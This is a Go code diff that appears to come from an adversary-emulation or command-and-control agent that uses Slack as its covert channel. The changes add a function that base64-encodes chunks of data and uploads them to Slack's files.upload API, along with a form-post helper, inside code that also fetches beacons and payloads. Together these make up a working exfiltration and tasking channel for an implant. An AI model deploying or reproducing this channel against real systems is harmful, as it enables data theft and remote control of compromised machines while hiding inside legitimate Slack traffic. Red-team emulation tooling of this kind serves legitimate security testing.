@@ -10,6 +10,7 @@ import (
 	"strconv"
 	"time"
 	"net/http"
+	"net/url"
 	"bytes"
 	"io/ioutil"
 	"strings"
@@ -24,7 +25,7 @@ const (
 	slackError = 500
 	beaconResponseFailThreshold = 3 // number of times to attempt fetching a beacon slack response before giving up.
 	beaconWait = 10 // number of seconds to wait for beacon slack response in case of initial failure.
-	maxDataChunkSize = 750000 // Github SLACK has max file size of 1MB. Base64-encoding 786432 bytes will hit that limit
+	maxDataChunkSize = 750000 // SLACK has max file size of 1MB. Base64-encoding 786432 bytes will hit that limit
 	// todo: fix above line later
 )
 
@@ -54,7 +55,7 @@ func (g SLACK) GetBeaconBytes(profile map[string]interface{}) []byte {
 	return retBytes
 }
 
-//GetPayloadBytes load payload bytes from github
+//GetPayloadBytes load payload bytes
 func (g SLACK) GetPayloadBytes(profile map[string]interface{}, payloadName string) ([]byte, string) {
 	var payloadBytes []byte
 	var err error
@@ -136,7 +137,8 @@ func getSlackDescriptionForUpload(uploadId string, encodedFilename string, chunk
 }
 
 func uploadFileChunk(slackName string, slackDescription string, data []byte) error {
-	if result := createSlack(slackName, slackDescription, data); result != true {
+	output.VerbosePrint("[-] Uploading file...")
+	if result := createSlackContent(slackName, slackDescription, data); result != true {
 		return errors.New(fmt.Sprintf("Failed to create file upload SLACK. Response code: %s", result))
 	}
 	return nil
@@ -202,6 +204,20 @@ func slackResults(result map[string]interface{}) {
 	}
 }
 
+func createSlackContent(slackName string, description string, data []byte) bool {
+	// returns false if it failed, true if success
+	stringified := base64.StdEncoding.EncodeToString(data)
+	// slackText := fmt.Sprintf("%s | %s", slackName, stringified);
+	requestBody := url.Values{}
+    requestBody.Set("channels", channel_id)
+    requestBody.Set("initial_comment", fmt.Sprintf("%s | %s", slackName, description))
+	requestBody.Set("content", stringified)
+
+	var result map[string]interface{}
+	json.Unmarshal(post_form("https://slack.com/api/files.upload", requestBody), &result);
+
+	return result["ok"].(bool);
+}
 
 
 func createSlack(slackName string, description string, data []byte) bool {
@@ -349,6 +365,35 @@ func post_request(address string, data []byte) []byte {
 	req, err := http.NewRequest("POST", address, bytes.NewBuffer(data))
 	req.Header.Set("Authorization", "Bearer " + token)
 	req.Header.Set("Content-Type", "application/json")
+	req.Header.Set("charset", "utf-8")
+	
+	if err != nil {
+		output.VerbosePrint(fmt.Sprintf("[-] Failed to create HTTP request: %s", err.Error()))
+		return nil
+	}
+	timeout := time.Duration(slackTimeout * time.Second)
+	client := http.Client{
+		Timeout: timeout,
+	}
+	resp, err := client.Do(req)
+	if err != nil {
+		output.VerbosePrint(fmt.Sprintf("[-] Failed to perform HTTP request: %s", err.Error()))
+		return nil
+	}
+	body, err := ioutil.ReadAll(resp.Body)
+	if err != nil {
+		output.VerbosePrint(fmt.Sprintf("[-] Failed to read HTTP response: %s", err.Error()))
+		return nil
+	}
+	return body
+}
+
+func post_form(address string, data url.Values) []byte {
+	// data should already be encoded
+	//encodedData := []byte(base64.StdEncoding.EncodeToString(data))
+	req, err := http.NewRequest("POST", address, strings.NewReader(data.Encode()))
+	req.Header.Set("Authorization", "Bearer " + token)
+	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
 	req.Header.Set("charset", "utf-8")
 	
 	if err != nil {
